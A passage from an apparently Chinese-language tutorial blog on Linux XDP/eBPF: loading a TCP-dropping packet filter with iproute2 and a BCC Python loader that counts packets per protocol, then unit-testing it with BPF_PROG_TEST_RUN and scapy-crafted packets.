mysection</span><br></pre></td></tr></table></figure><p>对上述命令的分析如下</p><p>ip：调用ip命令</p><p>link：配置网络接口</p><p>set：更改设备属性</p><p>dev eth0：指定我们要在其上操作和加载XDP程序的网络设备</p><p>xdp obj program.o：从名为<code>program.o</code>的ELF文件（对象）加载XDP程序。 此命令的xdp部分告诉系统在可用时使用本机驱动程序，否则回退到通用驱动程序。你可以通过使用更具体的选择器来强制使用一种或另一种模式：</p><ul><li>xdpgeneric to use generic XDP</li><li>xdpdrv to use native XDP</li><li>xdpoffload to use offloaded XDP</li></ul><p>sec mysection：指定包含要从ELF文件中使用的BPF程序的节名<code>mysection</code>； 如果未指定，将使用名为<code>prog</code>的部分。 如果程序中未指定任何部分，则必须在ip调用中指定sec <code>.text</code>。</p><p>在这个阶段，如果该命令返回零作为退出代码且没有错误，我们可以检查网络接口以查看程序是否已正确加载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a show eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 xdpgeneric/id:32 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>通过<code>ip a</code>输出了新的细节；在MTU后面显示<code>xdpgeneric/id:32</code>，它显示了两个有趣的信息：</p><ul><li>曾经使用过的驱动，xdpgeneric</li><li>XDP程序的ID，32</li></ul><p>最后一步是验证加载的程序是否确实在做它应该做的事情。我们可以通过在外部机器上再次执行<code>nmap</code>来观察端口8000不再可访问来验证这一点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 13:10 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br></pre></td></tr></table></figure><p>另一个验证它是否正常工作的测试是尝试通过浏览器访问程序或执行任何HTTP请求。 以<code>10.0.16.14</code>为目标时，任何类型的测试都应该失败。 这样我们就成功加在了第一个XDP程序！</p><p>如果您在需要恢复到原始状态的机器上执行了所有这些步骤，则可以随时分离程序并关闭设备的XDP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ip link <span class="built_in">set</span> dev eth0 xdp off</span></span><br></pre></td></tr></table></figure><p>在使用<code>iproute2</code>作为加载器时可以跳过自己编写加载器的部分。在这个例子中，我们的重点是<code>iproute2</code>，它已经为XDP程序实现了一个加载器。这些程序实际上是BPF程序，因此即使<code>iproute2</code>有时很方便，你可以使用 BCC 加载程序，例如在下一节你可以直接使用bpf系统调用。拥有自定义加载器的优点是允许管理程序的生命周期及其与用户空间的交互。</p><h4 id="XDP和BCC"><a href="#XDP和BCC" class="headerlink" title="XDP和BCC"></a>XDP和BCC</h4><p>与其他BPF程序一样，可以使用BCC编译、加载和运行XDP程序。 接下来的示例显示了一个XDP程序，它与我们用于<code>iproute2</code>的程序类似，但它具有BCC制作的自定义用户空间加载程序。在这种情况下需要加载程序是因为要计算在丢弃TCP数据包时遇到的数据包数量。</p><p>首先还是创建一个名为<code>program.c</code>的内核空间程序。</p><p>在<code>iproute2</code>示例中，我们的程序需要为与BPF和协议相关的结构和函数定义导入所需的头文件。这里我们做同样的事情，但我们还使用<code>BPF_TABLE</code>宏声明了<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型的映射。 该映射将包含每个IP协议索引的数据包计数器，这就是大小为256的原因（IP规范仅包含256个值）。 我们想使用<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型，因为它可以保证CPU级别的计数器的原子性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br></pre></td></tr></table></figure><p>之后声明主函数<code>myprogram</code>，它将<code>xdp_md</code>结构作为参数。 首先需要包含的是以太网IPv4帧的变量声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span> <span class="keyword">long</span> *cnt;</span><br><span class="line">__u32 idx;</span><br><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br></pre></td></tr></table></figure><p>在我们完成所有变量声明并且可以访问包含以太网帧的数据指针和带有IPv4数据包的ip指针之后，我们可以检查内存空间是否超出范围。 如果是，我们丢弃数据包。 如果内存空间没问题，我们提取协议并查找<code>packetcnt</code>数组以获取变量<code>idx</code>中当前协议的数据包计数器的先前值。然后将计数器加一。处理完增量后，我们可以继续检查协议是否为TCP。 如果是，我们就直接丢弃数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line">idx = ip-&gt;protocol;</span><br><span class="line">cnt = packetcnt.lookup(&amp;idx); </span><br><span class="line"><span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">*cnt += <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="keyword">long</span> *cnt;</span><br><span class="line">  __u32 idx;</span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  idx = ip-&gt;protocol;</span><br><span class="line">  cnt = packetcnt.lookup(&amp;idx);</span><br><span class="line">  <span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">    *cnt += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以编写加载程序<code>loader.py</code></p><p>它由两部分组成：实际加载逻辑和打印数据包的循环计数。</p><p>对于加载逻辑，我们通过读取文件<code>program.c</code>打开程序。 通过<code>load_func</code>指示bpf系统调用使用程序类型 <code>BPF.XDP</code>将<code>myprogram</code>函数用作“main”。 这代表`BPF_PROG_TYPE_XDP    。</p><p>加载后，我们可以使用<code>get_table</code>访问名为<code>packetcnt</code>的BPF映射。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br></pre></td></tr></table></figure><p>我们需要编写的剩余部分是打印数据包计数的实际循环。我们有两个循环。 外部循环获取键盘事件并在有信号中断程序时终止。当外循环中断时，将调用<code>remove_xdp</code>函数，并将接口从XDP程序中释放出来。</p><p>在外循环中，内循环的职责是从<code>packetcnt</code>映射中取回值并格式化打印它们：<code>counter pkt/s</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">prev=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>) </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">val = packetcnt.sum(k).value i = k.value</span><br><span class="line"><span class="keyword">if</span> val:</span><br><span class="line">          delta = val - prev[i]</span><br><span class="line">prev[i] = val</span><br><span class="line">print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">print(<span class="string">"Removing filter from device"</span>) </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>loader.py</code>程序完整如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br><span class="line"></span><br><span class="line">prev = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">            val = packetcnt.sum(k).value</span><br><span class="line">            i = k.value</span><br><span class="line">            <span class="keyword">if</span> val:</span><br><span class="line">                delta = val - prev[i]</span><br><span class="line">                prev[i] = val</span><br><span class="line">                print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"Removing filter from device"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>现在我们可以通过简单地使用执行加载程序来测试该程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# python3 loader.py</span><br></pre></td></tr></table></figure><p>现在我们已经加载了程序，可以通过eth0接口发送一些数据包，ping是一个很好的尝试方法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# ping 10.0.16.14</span><br><span class="line">PING 10.0.16.14 (10.0.16.14) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=1 ttl=64 time=0.012 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=2 ttl=64 time=0.019 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=3 ttl=64 time=0.021 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=4 ttl=64 time=0.021 ms</span><br></pre></td></tr></table></figure><p>之后可以看到程序开始打印结果。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Printing packet counts per IP protocol-number, hit CTRL+C to stop</span><br><span class="line">0: 1 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br></pre></td></tr></table></figure><h3 id="测试XDP程序"><a href="#测试XDP程序" class="headerlink" title="测试XDP程序"></a>测试XDP程序</h3><p>在开发XDP程序时，最困难的部分是为了测试实际的数据包流需要重现一个环境，其中所有组件都对齐以提供正确的数据包。尽管现在使用虚拟化技术，创建工作环境确实是一件容易的事，但复杂的设置也会限制测试环境的可重复性和可编程性，这也是事实。 除此之外，在虚拟化环境中分析XDP程序的性能方面时，虚拟化的成本使测试无效，因为它比实际的数据包处理要可观得多。</p><p>幸运的是，内核开发人员有一个解决方案。他们实现了一个可用于测试XDP程序的命令，称为<code>BPF_PROG_TEST_RUN</code>。</p><p>本质上，<code>BPF_PROG_TEST_RUN</code>让XDP程序连同一个输入包和一个输出包一起执行。 程序执行时，会填充输出数据包变量，并返回XDP代码。 这意味着你可以在断言测试中使用输出数据包和返回代码！这种技术也可以用于<code>skb</code>程序。</p><p>为了完整测试这个示例，我们使用Python及其单元测试框架。</p><h4 id="使用Python单元测试框架测试XDP程序"><a href="#使用Python单元测试框架测试XDP程序" class="headerlink" title="使用Python单元测试框架测试XDP程序"></a>使用Python单元测试框架测试XDP程序</h4><p>使用<code>BPF_PROG_TEST_RUN</code>编写XDP测试并将它们与Python单元测试框架<code>unittest</code>集成是一个好主意，原因如下：</p><ul><li>你可以使用Python BCC库加载和执行BPF程序</li><li>Python拥有最好的数据包制作和自省库之一：<code>scapy</code></li><li>Python通过<code>ctypes</code>与C结构集成</li></ul><p>如前所述，我们需要导入所有需要的库；这是我们将在名为<code>test_xdp.py</code>的文件中做的第一件事：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span> </span><br><span class="line">  SKB_OUT_SIZE = <span class="number">1514</span> <span class="comment"># mtu 1500 + 14 ethernet size </span></span><br><span class="line">  bpf_function = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>导入所有需要的库后，我们可以继续并创建一个名为<code>XDPExampleTestCase</code>的测试用例类。 这个测试类将包含我们所有的测试用例和成员方法(<code>_xdp_test_run</code>)，我们将使用它来进行断言并调用<code>bpf_prog_test_run</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br></pre></td></tr></table></figure><p>该函数有三个参数</p><p>given_packet：这是我们测试XDP程序的数据包； 它是接口接收到的原始数据包。</p><p>expected_packet：这是我们期望在XDP程序处理后收到的数据包；当XDP程序返回<code>XDP_DROP</code>或<code>XDP_ABORT</code>时，我们希望它为None；在所有其他情况下，数据包与<code>given_packet</code>保持相同或可以修改。</p><p>expected_return：这是处理我们的<code>given_packet</code>后XDP程序的预期返回。</p><p>除了参数之外，这个方法的主体很简单。它使用<code>ctypes</code>库转换为C类型，然后调用与<code>BPF_PROG_TEST_RUN</code>等效的<code>libbcc</code>，<code>libbcc.lib.bpf_prog_test_run</code>，使用我们的数据包及其元数据作为测试参数。然后根据测试调用的结果以及给定的值执行所有断言。</p><p>有了这个功能之后，我们基本上可以通过制作不同的数据包来测试它们在通过我们的XDP程序时的行为方式来编写测试用例，但在此之前，我们需要为我们的测试做一个<code>setUp</code>方法。</p><p>这部分至关重要，因为安装程序通过打开并编译名为<code>program.c</code>的源文件（这是我们的XDP代码所在的文件）来执行名为<code>myprogram</code>的BPF程序的实际加载：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">    bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">    self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br></pre></td></tr></table></figure><p>设置完成后，下一步是编写我们要观察的第一个行为。我们想测试一下我们是否会丢弃所有TCP数据包。</p><p>所以我们在<code>given_packet</code>中制作了一个数据包，它只是一个基于IPv4的TCP数据包。 然后，使用我们的断言方法<code>_xdp_test_run</code>，我们只是验证给定我们的数据包，我们将返回一个没有返回数据包的 <code>XDP_DROP</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP()</span><br><span class="line">    self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br></pre></td></tr></table></figure><p>我们还想明确测试是否允许所有UDP数据包。 然后我们制作两个UDP数据包，一个用于<code>given_packet</code>，一个用于<code>expected_packet</code>，它们本质上是相同的。 通过这种方式，我们测试UDP数据包在<code>XDP_PASS</code>允许的情况下不会被修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / UDP()</span><br><span class="line">    expected_packet = Ether() / IP() / UDP()</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br></pre></td></tr></table></figure><p>为了让事情变得更复杂一点，我们决定这个系统将允许TCP数据包在它们到达端口9090的条件下。它们将被重写以更改目标MAC地址以重定向到特定的网络。地址为<code>08:00:27:dd:38:2a</code>的工作接口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">        IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br></pre></td></tr></table></figure><p>有了大量的测试用例，我们现在为我们的测试程序编写入口点，它只会调用 unittest.main() 然后加载并执行我们的测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  unittest.main()</span><br></pre></td></tr></table></figure><p><code>test_xdp.py</code>完整程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> 